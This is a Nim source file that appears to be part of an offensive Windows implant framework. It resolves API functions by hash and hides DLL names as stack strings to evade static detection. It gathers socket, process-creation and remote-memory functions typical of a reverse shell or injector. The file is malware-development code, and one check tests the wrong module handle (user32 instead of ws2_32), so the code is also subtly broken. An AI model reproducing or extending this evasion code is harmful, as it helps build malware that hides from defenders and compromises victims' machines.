import std/[macros]
import winim

import utils/[gpa, gmh, hash, stackstr]

type
  MODULES* {.pure.} = object
    advapi32*: HMODULE
    kernel32*: HMODULE
    user32*:   HMODULE
    ws2_32*:   HMODULE


  WIN32* {.pure.} = object
    # KERNEL32.DLL
    CloseHandle*:                 type(CloseHandle)
    CreateFileW*:                 type(CreateFileW)
    CreateProcessA*:              type(CreateProcessA)
    ExitProcess*:                 type(winbase.ExitProcess)
    GetComputerNameExA*:          type(GetComputerNameExA)
    GetCurrentDirectoryA*:        type(GetCurrentDirectoryA)
    GetModuleFileNameW*:          type(GetModuleFileNameW)
    GetStdHandle*:                type(GetStdHandle)
    GetLastError*:                type(GetLastError)
    GetProcessHeap*:              type(GetProcessHeap)
    LoadLibraryA*:                type(LoadLibraryA)
    LocalAlloc*:                  type(LocalAlloc)
    LocalFree*:                   type(winbase.LocalFree)
    SetFileInformationByHandle*:  type(SetFileInformationByHandle)
    Sleep*:                       type(winbase.Sleep)
    WriteConsoleA*:               type(WriteConsoleA)
    VirtualAllocEx*:              type(VirtualAllocEx)

    # Advapi32.DLL
    GetUserNameA*:                type(GetUserNameA)

    # USER32.DLL
    wsprintfA*:                   type(winuser.wsprintfA)

    # ws2_32.dll
    WSASocketA*:                  type(WSASocketA)
    WSAStartup*:                  type(WSAStartup)
    inet_addr*:                   type(inet_addr)
    htons*:                       type(htons)
    connect*:                     type(connect)


  
  NIMLESS_INSTANCE* {.pure.} = object
    Module*: MODULES
    Win32*: WIN32
    IsInitialized*: bool

#[ Global Instance ]#
var ninst*: NIMLESS_INSTANCE

#[ Macro to initialize the function pointers ]#
proc makeCast(inst, modul, handl, class, fn: NimNode): NimNode =
  result = newNimNode(nnkCast)
  var 
    callExpr1 = newNimNode(nnkCall)
    callExpr2 = newNimNode(nnkCall)
  callExpr1.add(ident"type", newDotExpr(newDotExpr(inst, class), fn))
  callExpr2.add(ident"getProcAddressHash", 
                newDotExpr(newDotExpr(inst, modul), handl),
                newCall(
                  ident"static",
                  newCall(
                    ident"hashStrA",
                    newDotExpr(toStrLit(fn), ident"cstring")
                  )
                )
              )
  result.add(callExpr1)
  result.add(callExpr2)
  
  
macro getFuncPtr*(sect0, sect1): untyped =
  result = newStmtList()
  var 
    inst  = sect0[0][0]
    modul = sect0[0][1]
    handl = sect0[1]
    class = sect1[0][1]
    fn    = sect1[1]
    asgnNode = newNimNode(nnkAsgn)
    instExpr = newDotExpr(newDotExpr(inst, class), fn)
    castExpr = makeCast(inst, modul, handl, class, fn)
  asgnNode.add(instExpr)
  asgnNode.add(castExpr)
  result.add(asgnNode)


#[ Initialization Functions ]#
proc init*(ninst: var NIMLESS_INSTANCE): bool = 
  # Load Kernel32 Functions
  ninst.Module.kernel32 = gmh("kernel32")
  if ninst.Module.kernel32 != 0:
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CloseHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateFileW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateProcessA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.ExitProcess)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetComputerNameExA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetCurrentDirectoryA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetModuleFileNameW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetLastError)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetProcessHeap)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetStdHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LoadLibraryA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalAlloc)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalFree)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.SetFileInformationByHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.Sleep)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.WriteConsoleA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.VirtualAllocEx)
  else: return false

  # Load Advapi32.dll
  var advapi {.stackStringA.} = "Advapi32.dll" 
  ninst.Module.advapi32 = ninst.Win32.LoadLibraryA(cast[cstring](advapi[0].addr))
  if ninst.Module.advapi32 != 0:
    getFuncPtr(ninst.Module.advapi32, ninst.Win32.GetUserNameA)
  else: return false

  # Load USER32.dll
  var user32 {.stackStringA.} = "user32.dll"
  ninst.Module.user32 = ninst.Win32.LoadLibraryA(cast[cstring](user32[0].addr))
  if ninst.Module.user32 != 0:
    getFuncPtr(ninst.Module.user32, ninst.Win32.wsprintfA)
  else: return false

  # Load ws_32.dll
  var ws2_32 {.stackStringA.} = "ws2_32.dll"
  ninst.Module.ws2_32= ninst.Win32.LoadLibraryA(cast[cstring](ws2_32[0].addr))
  if ninst.Module.user32 != 0:
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.WSASocketA)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.WSAStartup)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.inet_addr)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.htons)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.connect)
  else: return false




  ninst.IsInitialized = true
  
  return true
